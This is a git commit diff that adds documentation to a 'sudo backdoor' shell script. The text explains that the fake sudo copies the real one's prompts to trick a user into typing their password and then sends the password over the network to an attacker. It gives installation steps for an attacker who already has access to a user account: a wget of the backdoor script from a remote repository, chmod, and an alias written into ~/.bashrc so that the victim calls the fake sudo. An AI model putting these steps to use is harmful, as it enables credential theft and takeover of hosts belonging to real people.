f6393f280d034a174cc3e52fba9013bce957b29a
babywyrm <55672787+babywyrm@users.noreply.github.com>
2023-06-13 20:35:37 -0700

    Update backdoor_.sh

--- sudo/backdoor_.sh
+++ sudo/backdoor_.sh
@@ -77,3 +77,40 @@ exit 0
 
 ##
 ##
+
+##
+##
+
+# Sudo backdoor
+This bash script mimics the original sudo binary behavior to con a user into
+typing his password.
+
+The backdoored sudo displays different message based on the locale language used
+on the host (english and french for the time being).
+
+The password is sent over the network for the attacker to retrieve.
+
+## Installation
+Once you gain access to a user account that you suspect being sudoer, you can
+place this backdoored sudo script to gain administrative control over the host.
+
+```
+wget https://raw.githubusercontent.com/nisay759/sudo-backdoor/master/sudo.sh -O /somewhere/sudo
+chmod +x /somewhere/sudo
+```
+
+Modify the script (the line before the last one) to adapt the extraction method
+with a one that fits your use-case.
+
+Next, you want the user to call the backdoored sudo instead of the original one:
+
+```
+echo 'alias sudo="/somewhere/sudo"' >> ~/.bashrc
+```
+for example.
+
+## TODO
+- [ ] Add support for other locales
+
+##
+##
